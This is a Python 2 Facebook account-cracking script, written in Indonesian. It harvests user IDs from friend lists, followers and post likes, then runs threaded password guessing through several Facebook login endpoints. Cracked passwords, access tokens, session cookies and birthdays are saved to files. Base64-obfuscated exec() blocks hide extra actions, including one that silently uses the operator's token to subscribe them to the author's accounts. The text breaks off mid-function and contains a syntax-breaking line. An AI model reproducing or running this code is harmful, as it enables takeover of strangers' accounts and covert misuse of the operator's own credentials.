
Hj = '\x1b[1;92m' 
Mt = '\x1b[0m' 
ingfo = (
"""%s
 • Info script :
 	
 - author      : Saputra
 - facebook    : facebook.com/fiet.riyan.9
 - fanspage    : facebook.com/100001205119844
 - whatsap     : -
 - github      : https://github.com/Saputra8
 - script name : z2
 - version     : 1.1
 
%s"""%(Hj,Mt))

import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')
    
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime
exec(base64.b64decode('Y3QgPSBkYXRldGltZS5ub3coKQ0KbiA9IGN0Lm1vbnRoDQpidWxhbjEgPSB7IjAxIjogIkphbnVhcmkiLCAiMDIiOiAiRmVicnVhcmkiLCAiMDMiOiAiTWFyZXQiLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWVpIiwgIjA2IjogIkp1bmkiLCAiMDciOiAiSnVsaSIsICIwOCI6ICJBZ3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPa3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlc2VtYmVyIn0NCmJ1bGFuID0gWydKYW51YXJpJywgJ0ZlYnJ1YXJpJywgJ01hcmV0JywgJ0FwcmlsJywgJ01laScsICdKdW5pJywgJ0p1bGknLCAnQWd1c3R1cycsICdTZXB0ZW1iZXInLCAnT2t0b2JlcicsICdOb3ZlbWJlcicsICdEZXNlbWJlciddDQp0cnk6DQogICAgaWYgbiA8IDAgb3IgbiA+IDEyOg0KICAgICAgICBleGl0KCkNCiAgICBuVGVtcCA9IG4gLSAxDQpleGNlcHQgVmFsdWVFcnJvcjoNCiAgICBleGl0KCkNCg0KY3VycmVudCA9IGRhdGV0aW1lLm5vdygpDQp0YSA9IGN1cnJlbnQueWVhcg0KYnUgPSBjdXJyZW50Lm1vbnRoDQpoYSA9IGN1cnJlbnQuZGF5DQpvcCA9IGJ1bGFuW25UZW1wXQ0KcmVsb2FkKHN5cykNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0Zi04JykNCiMgS1VNUFVMQU4gV0FSTkENCk0gPSAnXHgxYlsxOzkxbScgIyBNRVJBSA0KSCA9ICdceDFiWzE7OTJtJyAjIEhJSkFVDQpLID0gJ1x4MWJbMTs5M20nICMgS1VOSU5HDQpCID0gJ1x4MWJbMTs5NG0nICMgQklSVQ0KVSA9ICdceDFiWzE7OTVtJyAjIFVOR1UNCk8gPSAnXHgxYlsxOzk2bScgIyBCSVJVIE1VREENClAgPSAnXHgxYlsxOzk3bScgIyBQVVRJSA0KTiA9ICdceDFiWzBtJyAjIFdBUk5BIE1BVEkNCmFjYWsgPSBbTSwgSCwgSywgQiwgVSwgTywgUF0NCndhcm5hID0gcmFuZG9tLmNob2ljZShhY2FrKQ0KdGlsID0i4oCiIg=='))

ok = []
cp = []
id = []
user = []
loop = 0

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush();jeda(0.03)

def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s menghapus token %s'%(K,til,o)),
        sys.stdout.flush();jeda(1)
        
def folder():
	try:os.mkdir('hasil')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:
		ua_ = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1"
		open("data/ua.txt","w").write(ua_)
	except:
		pass
        
# LOGO
IP = requests.get('https://api.ipify.org').text
def banner():
	print (''' %s 
 © SELAMAT MENGGUNAKAN%s
\033[31;1m ____ ___ ____  __  __ ____  _____
\033[31;1m/ ___|_ _|  _ \|  \/  | __ )|  ___|%s %sFB     : Babang Saputra
\033[31;1m\___ \| || | | | |\/| |  _ \| |_   %s %sGITHUB : Saputra8
\033[37;1m ___) | || |_| | |  | | |_) |  _|  %s %sWA ME  : -
\033[37;1m|____/___|____/|_|  |_|____/|_|	   %s %sYT     : -

%s[%s*%s] AUTHOR : %Saputra
%s[%s*%s] ---------------------------------------------------
[%s*%s] IP ADRESS : %s%s
'''%(H,K,H,K,H,K,H,K,H,K,P,K,P,H,P,K,P,K,P,H,IP))
# MASUK TOKEN 
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');banner()
    print ('\033[36;1m----------------------------------------------------[$]')
    print ('\n[01] Login via token')
    print ('\n[02] Cara Mendapatkan Token')
    print ('\n[00] Keluar Aja Ngab')
    print ('\033[36;1m----------------------------------------------------[$]')
    rom = raw_input('\n%s [?] Metodhe : %s'%(K,K))
    if rom in(""):
    	print("%s [!] Isi yang benar bangke"%(P));exit()
    elif rom in ('1','01'):
        jalan("\n%s [%s!%s] MASUKAN TOKEN FACEBOOK KAMU DI BAWAH INI"%(P,M,P))
    	romz = raw_input('%s [?] Token : %s'%(K,K))
        if romz in(""):
        	print("%s [!] Isi yang benar Bangke"%(K));exit()
    	try:
            gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
            print ('\n%s[•] LOGIN BERHASIL'%(M));jeda(2)
            open('token.txt', 'w').write(romz);login_xx()
            exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
        except (KeyError,IOError):
        	print("%s [!] Token invalid "%(K));masuk()
    elif rom in ('2', '02'):
    	print ("\n%s%s Berikut cara nya :"%(H,til));jeda(2)
        print (" - siapkan akun facebook (wajib akun tumbal)");jeda(2)
        print (" - loginkan akun facebook (tumbal) di browser %sChrome %s"%(O,H));jeda(2)
        print (" - url alamat wajib %shttps://m.facebook.com %s(mode data)"%(O,H));jeda(2)
        print (" - salin link : %shttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_"%(O));jeda(2)
        print ("%s - taruh link tersebut di url alamat facebook lalu klik cari "%(H));jeda(2)
        print (" - jika sudah, klik %stitik tiga %spojok kanan atas "%(O,H));jeda(2)
        print (" - kemudian klik %sCari di Halaman %s"%(O,H));jeda(2)
        print (" - ketik %sEAAAA %sakan muncul acces token."%(O,H));jeda(2)
        print (" - jika sudah jangan lupa di salin \n");jeda(2)
        nanya = raw_input('%s [?] Anda paham? [%sy%s/%sn%s] :%s '%(P,H,P,M,P,K))
        if nanya in(""):
        	print ("%s [!] saya bertanya wajib di jawab "%(M));jeda(2);masuk()
        elif nanya in("y","Y"):
        	print ("\n%s [√] selamat anda pintar :* "%(H));jeda(2);masuk()
        elif nanya in("n","N"):
        	print ("\n%s [!] anda sungguh tolol "%(M));jeda(2);os.system("xdg-open https://youtu.be/IG5QfdxRkeY");masuk()
    elif rom in ('0', '00'):
    	exit('\n')
    else:
    	print("%s [!] Isi yang benar"%(K));exit()

# MENU 
def menu():
    os.system('clear')
    print ('\033[36;1mGA ADA RUGINYA SUSCRIBE BENTAR :) ')
    os.system('xdg-open https://youtube.com/channel/UCbOYxt4HRGh7UJ48a16qP_g')
    os.system('clear')
    try:
    	romz = open('token.txt', 'r').read()
    except IOError:
        print ("%s [!] Token invalid "%(K));jeda(2);os.system('rm -rf token.txt');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+romz,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
    except KeyError:
        print("%s [!] Token invalid "%(K));jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    except requests.exceptions.ConnectionError:
        exit("%s [!] Kesalahan koneksi "%(K))
    banner()
    print (' %s[ Selamat Datang %s%s%s ] \n'%(K,K,nama,K))
    print (' <%s01%s> Dump id public'%(M,K)) 
    print (' <%s02%s> Dump id followers ( TERDAPAT BUG BIASANYA ) '%(M,K)) 
    print (' <%s03%s> Dump id reaction post'%(M,K)) 
    print (' <%s04%s> %sStart crack %s'%(M,K,K,K)) 
    print (' <%s05%s> Ganti user agent'%(M,K)) 
    print (' <%s06%s> Cek hasil crack'%(M,K)) 
    #print (' [%s07%s] Gabung group'%(K,P))
    #print (' [%s08%s] Info script'%(K,P))
    print (' <%s00%s> Keluar (hapus token)'%(M,K))
    unik = raw_input('\n%s [?] PILIH MANA GANTENG : %s'%(H,H))
    if unik == '':
        print("%s [!] Isi yang benar bangsat "%(K));jeda(2);menu()
    elif unik in['1','01']:
        publik(romz)
    elif unik in['2','02']:
        followers(romz)
    elif unik in['3','03']:
        postingan(romz)
    elif unik in['4','04']:
        ngentod().romiy()
    elif unik in['5','05']:
    	useragent()
    elif unik in['6','06']:
    	try:
            dirs = os.listdir("hasil")
            print
            for file in dirs:
                print("%s -> %s%s"%(K,P,file));jeda(0.2)
            print("\n %s[%s!%s] cth : CP-%s-%s-%s%s"%(P,M,P,ha,op,ta,".txt"))
            file = raw_input("%s [?] masukan file : "%(P));jeda(0.2)
            if file == "":
                print("%s [!] file tidak ada "%(M))
            total = open("hasil/%s"%(file)).read().splitlines()
            print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
            nm_file = ("%s"%(file)).replace("-", " ")
            jalan(" [%s*%s] total akun : %s"%(K,P,len(total)))
            print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
            for akun in total:
            	fb = akun.replace("\n","")
                tling  = fb.replace(" *--> ", " *-->").replace(" *-->", " *--> ")
                print(tling);jeda(0.03)
            print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
            raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
        except (IOError):
            print("\n%s [!] tidak ada hasil "%(K))
            raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
    elif unik in['7','07']:
        os.system("xdg-open https://www.facebook.com/groups/924679595149360")
    elif unik in['8','08']:
        print(ingfo)
    elif unik in['0','00']:
        print ('')
        tik();jeda(1);os.system('rm -rf token.txt')
        jalan('\n%s [!] berhasil terhapus '%(H));exit()
    else:
        print("%s [!] Isi yang benar"%(K));jeda(2);menu()
 
exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBGYW5zcGFnZSBSb21pIFhECiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNjc4MDc1NjU4NjEvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIFJvbWkgQWZyaXphbCAoMjAyMSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDM3MjM2OTY4ODUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIElxYmFsIGJvYnoKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaAogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwNzUyMDIwMzQ1Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSGFtemFoIGtpcmFuYQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMjQ2MTM0NDE3OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVW5payBST01JIEFGUklaQUwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNzE3NDc0MjA1ODMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIERvbmlmdGZhbm55CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI5MTQzMTExNTY3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBEZW1pdCBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDE1NDAyOTkxMDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEhha2lraQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDA1NTkxODM5MTI4MC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVGlhcmEgYXJ0CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDA5Mzg0MzM4NDcwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBJd2FuIGhhbmRpYW5zeWFoIHYyCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDM2NjU1MzI1OTk2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBBYnVzdG8gSmF2YQogICAgZXhjZXB0OgogICAgCXBhc3M='))

def publik(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s [%s$%s] Ketik '%sme%s' jika ingin dump daftar teman sendiri "%(K,K,K,K,K))
        idt = raw_input(' [*] Target id : %s'%(M))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,romz))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)

        bff.close()
        print ('\n\n %s[%s√%s] Succes dump id dari %s%s'%(M,P,M,P,nm['name']))
        print ('%s [%s√%s] File dump tersimpan :%s %s '%(M,P,M,P,file))
        raw_input('\n%s [ %senter %s] '%(M,P,M))
        menu()
    except Exception as e:
        exit('\n %s[!] gagal dump id'%(K))

# DUMP FOLLOWERS
def followers(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump followers sendiri "%(P,M,P,H,P))
        idt = raw_input(' [*] Target id : %s'%(K))
        batas = raw_input(' %s[*] Maximal id : %s'%(P,K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,romz))
        z = json.loads(r.text)
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
        print (' %s[%s√%s] File dump tersimpan :%s %s '%(P,H,P,H,file))
        raw_input('\n%s [ %senter %s] '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n %s[!] gagal dump id'%(P))
  
# DUMP POSTINGAN 
def postingan(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s [%s!%s] Perlu di ingat postingan wajib publik "%(H,H,H))
        idt = raw_input(' [*] Id post   : %s'%(H))
        simpan = raw_input(' %s[?] Nama file : %s'%(H,P))
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,romz))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        bff = open(file, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] mengumpulkan id :%s %s ' % (H,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)

        bff.close()
        print ('\n\n %s[%s√%s] Succes dump id postingan '%(H,H,H))
        print ('%s [%s√%s] File dump tersimpan :%s %s '%(H,H,H,H,file))
        raw_input('\n%s [ %senter %s] '%(H,H,H))
        menu()
    except Exception as e:
        exit('\n %s[!] gagal dump id'%(H))


# START CRACK
class ngentod:

    def __init__(self):
        self.id = []

    def romiy(self):
        try:
            self.apk = raw_input('\n %s[?] file dump :%s '%(M,M))
            self.id = open(self.apk).read().splitlines()
            print '%s [%s*%s] jumlah id : %s%s' %(M,M,M,M,len(self.id))
        except:
            print '\n%s [!] File dump tidak ada, dump id dulu TOLOL [!]'%(M)
            raw_input('\n%s [ %senter %s] '%(P,H,P));menu()
        unikers = raw_input('%s [?] ingin gunakan password manual? [y/t] :%s '%(M,M))
        if unikers in ('Y', 'y'):
            print '\n %s[%s!%s] cth : %ssayang,anjing%s gunakan , (koma) untuk pemisah '%(M,M,M,M,M)
            while True:
                pwx = raw_input(' %s[?] set password :%s '%(H,H))
                if pwx == '':
                    print '\n %s[!] jangan kosong '%(K)
                elif len(pwx)<=5:
                    print '\n %s[!] password minimal 6 karakter'%(M)
                else:
                    def zona(zafi_=None): 
                        ind = raw_input('\n %s[?] methode : %s'%(H,H))
                        if ind == '':
                            print("%s [!] Isi yang benar "%(H));self.zona()
                        elif ind in ('1', '01'):
                            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(M,M,M,M,M,M,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(M,M,M,M,M,M,ha, op, ta);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('2', '02'):
                            print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(M,M,M,M,M,M,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(M,M,M,M,M,M,ha, op, ta);jeda(0.2)
			    print '%s [%s!%s] JIKA %sTIDAK ADA HASIL %sAKTIKAN MODE PESAWAT'
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.basic, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('3', '03'):
                            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(H,H,H,H,H,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(H,H,H,H,H,H,ha, op, ta);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.mobil, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        else:
                            print ('\n %s[!] isi yang benar'%(M));zona()
                    print '\n%s [ pilih methode crack ]\n'%(H)
                    print ' [%s01%s] methode b-api'%(H,H)
                    print ' [%s02%s] methode mbasic'%(H,H)
                    print ' [%s03%s] methode mobile'%(H,H)
                    zona(pwx.split(','))
                    break
        elif unikers in ('T', 't'):
            print '\n%s [ pilih methode crack ]\n'%(H)
            print ' [%s01%s] methode b-api'%(H,H)
            print ' [%s02%s] methode mbasic'%(H,H)
            print ' [%s03%s] methode mobile'%(H,H)
            self.langsung()
        else:
            print("%s [!] Isi yang benar  "%(M));jeda(2);menu()

    def langsung(self):
        suuu = raw_input('\n %s[?] methode :%s '%(H,H))
        if suuu == '':
            print("%s [!] Isi yang benar "%(H));self.langsung()
        elif suuu in ('1', '01'):
            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(M,M,M,M,M,M,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(M,M,M,M,M,M,ha, op, ta);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.b_api, uid, pwx)
                    except:
                        pass
            os.remove(self.apk);exit()
        elif suuu in ('2', '02'):
            print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(M,M,M,M,M,M,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(M,M,M,M,M,M,ha, op, ta);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.basic, uid, pwx)
                    except:
                        pass
            os.remove(self.apk);exit()
        elif suuu in ('3', '03'):
            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(M,K,M,M,M,M,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(M,M,M,M,M,M,ha, op, ta);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.mobil, uid, pwx)
                    except:
                        pass
            os.remove(self.apk);exit()
        else:
            print("\n%s [!] Isi yang benar "%(M));self.langsung()

    def b_api(self, user, zona):
    	try:
    	    ua = open('data/ua.txt', 'r').read()
        except (KeyError, IOError):
        	ua = Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            bapi="https://b-api.facebook.com/method/auth.login"
            header = {"user-agent": ua,"x-fb-connection-bandwidth": str(random.randint(20000,40000)),"x-fb-sim-hni": str(random.randint(20000,40000)),"x-fb-net-hni": str(random.randint(20000,40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
            response = ses.get(bapi+'?format=json&email=' + user + '&password=' + pw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
            	print ("\r\033[0;91m [!] IP terblokir. hidupkan mode pesawat 2 detik"),
                sys.stdout.flush()
                loop +=1
                b_api(self, user, zona)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %s[ Crack ] %s ◊ %s ◊ %s ' % (H,user,pw,response.json()['access_token'])
                sv = '[ Crack ] %s ◊ %s ◊ %s'% (user,pw,response.json()['access_token'])
                ok.append(sv)
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s[ Crack ] %s ◊ %s ◊ %s %s %s  ' % (K,user,pw,day,month,year)
                    sv = '[ Crack ] %s ◊ %s ◊ %s %s %s' % (user,pw,day,month,year)
                    cp.append(sv)
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print '\r %s[ Crack ] %s ◊ %s           ' % (K,user,pw)
                sv = '[ Crack ] %s ◊ %s' % (user,pw)
                cp.append(sv)
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                break
                continue

        loop += 1
        print('\r %s[ Crack ] %s/%s OK-:%s - CP-:%s '%(P,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()

    def basic(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except (KeyError, IOError):
        	ua = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1"
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s[ Crack ] %s ◊ %s ◊ %s  ' % (H,user,pw,kuki)
                sv = '[ Crack ] %s ◊ %s ◊ %s' % (user,pw,kuki)
                ok.append(sv)
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s[ Crack ] %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    sv = '[ Crack ] %s ◊ %s ◊ %s %s %s' % (user,pw,day,month,year)
                    cp.append(sv)
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print '\r %s[ Crack ] %s ◊ %s            ' % (K,user,pw)
                sv = '[ Crack ]%s ◊ %s' % (user,pw)
                cp.append(sv)
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                break
                continue

        loop += 1
        print('\r %s[ Crack ]%s/%s OK-:%s - CP-:%s '%(P,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()

    def mobil(self, user, zona):
        try:
